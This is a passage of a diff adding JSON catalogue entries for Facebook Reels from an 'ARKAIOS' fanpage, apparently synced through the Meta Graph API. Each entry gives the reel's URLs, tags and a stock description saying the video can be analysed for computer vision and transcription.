+    "external_resource": "https://www.facebook.com/reel/1654920079619082/"
+  },
+  {
+    "id": "meta-776644758860856_122176933166989266",
+    "title": "ARKAIOS Reel #28295368073449798",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/28295368073449798/",
+    "canonical_url": "https://www.facebook.com/reel/28295368073449798/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/28295368073449798/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/28295368073449798/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/28295368073449798/"
+  },
+  {
+    "id": "meta-776644758860856_122176933034989266",
+    "title": "ARKAIOS Reel #28656097404025023",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/28656097404025023/",
+    "canonical_url": "https://www.facebook.com/reel/28656097404025023/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/28656097404025023/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/28656097404025023/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/28656097404025023/"
+  },
+  {
+    "id": "meta-776644758860856_122176932974989266",
+    "title": "ARKAIOS Reel #1822472098765679",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1822472098765679/",
+    "canonical_url": "https://www.facebook.com/reel/1822472098765679/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1822472098765679/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1822472098765679/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1822472098765679/"
+  },
+  {
+    "id": "meta-776644758860856_122176932770989266",
+    "title": "ARKAIOS Reel #3033513220321213",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/3033513220321213/",
+    "canonical_url": "https://www.facebook.com/reel/3033513220321213/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/3033513220321213/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/3033513220321213/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/3033513220321213/"
+  },
+  {
+    "id": "meta-776644758860856_122176932686989266",
+    "title": "ARKAIOS Reel #921417467221591",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/921417467221591/",
+    "canonical_url": "https://www.facebook.com/reel/921417467221591/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/921417467221591/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/921417467221591/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/921417467221591/"
+  },
+  {
+    "id": "meta-776644758860856_122176932644989266",
+    "title": "ARKAIOS Reel #1433331658706714",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1433331658706714/",
+    "canonical_url": "https://www.facebook.com/reel/1433331658706714/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1433331658706714/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1433331658706714/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1433331658706714/"
+  },
+  {
+    "id": "meta-776644758860856_122176931702989266",
+    "title": "ARKAIOS Reel #1414205493868558",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1414205493868558/",
+    "canonical_url": "https://www.facebook.com/reel/1414205493868558/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1414205493868558/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1414205493868558/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1414205493868558/"
+  },
+  {
+    "id": "meta-776644758860856_122176818830989266",
+    "title": "ARKAIOS Reel #2137752193782925",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2137752193782925/",
+    "canonical_url": "https://www.facebook.com/reel/2137752193782925/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2137752193782925/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2137752193782925/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2137752193782925/"
+  },
+  {
+    "id": "meta-776644758860856_122176435406989266",
+    "title": "ARKAIOS Reel #2589970644760519",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2589970644760519/",
+    "canonical_url": "https://www.facebook.com/reel/2589970644760519/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2589970644760519/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2589970644760519/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2589970644760519/"
+  },
+  {
+    "id": "meta-776644758860856_122176434506989266",
+    "title": "ARKAIOS Reel #1331376605502763",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1331376605502763/",
+    "canonical_url": "https://www.facebook.com/reel/1331376605502763/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1331376605502763/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1331376605502763/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1331376605502763/"
+  },
+  {
+    "id": "meta-776644758860856_122176434338989266",
+    "title": "ARKAIOS Reel #2252022218664212",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2252022218664212/",
+    "canonical_url": "https://www.facebook.com/reel/2252022218664212/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2252022218664212/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2252022218664212/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2252022218664212/"
+  },
+  {
+    "id": "meta-776644758860856_122176434176989266",
+    "title": "ARKAIOS Reel #1835157771068336",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1835157771068336/",
+    "canonical_url": "https://www.facebook.com/reel/1835157771068336/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1835157771068336/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1835157771068336/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1835157771068336/"
+  },
+  {
+    "id": "meta-776644758860856_122176022132989266",
+    "title": "ARKAIOS Reel #1605414871017255",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1605414871017255/",
+    "canonical_url": "https://www.facebook.com/reel/1605414871017255/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1605414871017255/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1605414871017255/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1605414871017255/"
+  },
+  {
+    "id": "meta-776644758860856_122176020536989266",
+    "title": "ARKAIOS Reel #1568621087828121",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1568621087828121/",
+    "canonical_url": "https://www.facebook.com/reel/1568621087828121/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1568621087828121/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1568621087828121/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1568621087828121/"
+  },
+  {
+    "id": "meta-776644758860856_122176019648989266",
+    "title": "ARKAIOS Reel #2441815189642250",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2441815189642250/",
+    "canonical_url": "https://www.facebook.com/reel/2441815189642250/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2441815189642250/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2441815189642250/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2441815189642250/"
+  },
+  {
+    "id": "meta-776644758860856_122176019462989266",
+    "title": "ARKAIOS Reel #1096274686220799",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1096274686220799/",
+    "canonical_url": "https://www.facebook.com/reel/1096274686220799/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1096274686220799/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1096274686220799/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1096274686220799/"
+  },
+  {
+    "id": "meta-776644758860856_122176015268989266",
+    "title": "ARKAIOS Reel #1522487263240599",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1522487263240599/",
+    "canonical_url": "https://www.facebook.com/reel/1522487263240599/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1522487263240599/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1522487263240599/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1522487263240599/"
+  },
+  {
+    "id": "meta-776644758860856_122175782468989266",
+    "title": "Así colapsó el peso: el día que nació el Efecto Tequila… y millones lo perdieron todo",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1375385914376740/",
+    "canonical_url": "https://www.facebook.com/reel/1375385914376740/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1375385914376740/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1375385914376740/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1375385914376740/"
+  },
+  {
+    "id": "meta-776644758860856_122175780890989266",
+    "title": "ARKAIOS Reel #26314560544908379",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/26314560544908379/",
+    "canonical_url": "https://www.facebook.com/reel/26314560544908379/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/26314560544908379/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/26314560544908379/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/26314560544908379/"
+  },
+  {
+    "id": "meta-776644758860856_122175780206989266",
+    "title": "ARKAIOS Reel #1758416481879214",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1758416481879214/",
+    "canonical_url": "https://www.facebook.com/reel/1758416481879214/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1758416481879214/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1758416481879214/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1758416481879214/"
+  },
+  {
+    "id": "meta-776644758860856_122175479186989266",
+    "title": "ARKAIOS Reel #27472515385758505",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/27472515385758505/",
+    "canonical_url": "https://www.facebook.com/reel/27472515385758505/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/27472515385758505/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/27472515385758505/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/27472515385758505/"
+  },
+  {
+    "id": "meta-776644758860856_122175476930989266",
+    "title": "ARKAIOS Reel #4618263441736744",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/4618263441736744/",
+    "canonical_url": "https://www.facebook.com/reel/4618263441736744/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/4618263441736744/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/4618263441736744/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/4618263441736744/"
+  },
+  {
+    "id": "meta-776644758860856_122175330368989266",
+    "title": "ARKAIOS Reel #1058972673407830",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1058972673407830/",
+    "canonical_url": "https://www.facebook.com/reel/1058972673407830/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1058972673407830/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1058972673407830/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1058972673407830/"
+  },
+  {
+    "id": "meta-776644758860856_122175253376989266",
+    "title": "ARKAIOS Reel #1017321294620552",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1017321294620552/",
+    "canonical_url": "https://www.facebook.com/reel/1017321294620552/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1017321294620552/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1017321294620552/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1017321294620552/"
+  },
+  {
+    "id": "meta-776644758860856_122175249242989266",
+    "title": "ARKAIOS Reel #2521600661640761",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2521600661640761/",
+    "canonical_url": "https://www.facebook.com/reel/2521600661640761/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2521600661640761/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2521600661640761/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2521600661640761/"
+  },
+  {
+    "id": "meta-776644758860856_122175247886989266",
+    "title": "ARKAIOS Reel #2703440896724309",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2703440896724309/",
+    "canonical_url": "https://www.facebook.com/reel/2703440896724309/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2703440896724309/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2703440896724309/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2703440896724309/"
+  },
+  {
+    "id": "meta-776644758860856_122175091772989266",
+    "title": "La inteligencia artificial cada vez necesita menos intervención humana… 🤖💻 ¿Le darías control de tu computadora a una",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1371147518340850/",
+    "canonical_url": "https://www.facebook.com/reel/1371147518340850/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1371147518340850/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1371147518340850/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1371147518340850/"
+  },
+  {
+    "id": "meta-776644758860856_122175067706989266",
+    "title": "ARKAIOS Reel #1086887814278269",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1086887814278269/",
+    "canonical_url": "https://www.facebook.com/reel/1086887814278269/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1086887814278269/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1086887814278269/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1086887814278269/"
+  },
+  {
+    "id": "meta-776644758860856_122175067016989266",
+    "title": "ARKAIOS Reel #2173171373602435",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2173171373602435/",
+    "canonical_url": "https://www.facebook.com/reel/2173171373602435/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2173171373602435/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2173171373602435/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2173171373602435/"
+  },
+  {
+    "id": "meta-776644758860856_122174935514989266",
+    "title": "ARKAIOS Reel #2287686625410787",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2287686625410787/",
+    "canonical_url": "https://www.facebook.com/reel/2287686625410787/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2287686625410787/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2287686625410787/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2287686625410787/"
+  },
+  {
+    "id": "meta-776644758860856_122174926664989266",
+    "title": "ARKAIOS Reel #1096614582905501",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1096614582905501/",
+    "canonical_url": "https://www.facebook.com/reel/1096614582905501/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1096614582905501/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1096614582905501/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1096614582905501/"
+  },
+  {
+    "id": "meta-776644758860856_122174923202989266",
+    "title": "ARKAIOS Reel #1129496943357611",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1129496943357611/",
+    "canonical_url": "https://www.facebook.com/reel/1129496943357611/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1129496943357611/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1129496943357611/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1129496943357611/"
+  },
+  {
+    "id": "meta-776644758860856_122174712074989266",
+    "title": "Solo firma en comentarios con tu @\"nombre\" y listo!!!.",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/26545599561729870/",
+    "canonical_url": "https://www.facebook.com/reel/26545599561729870/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/26545599561729870/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
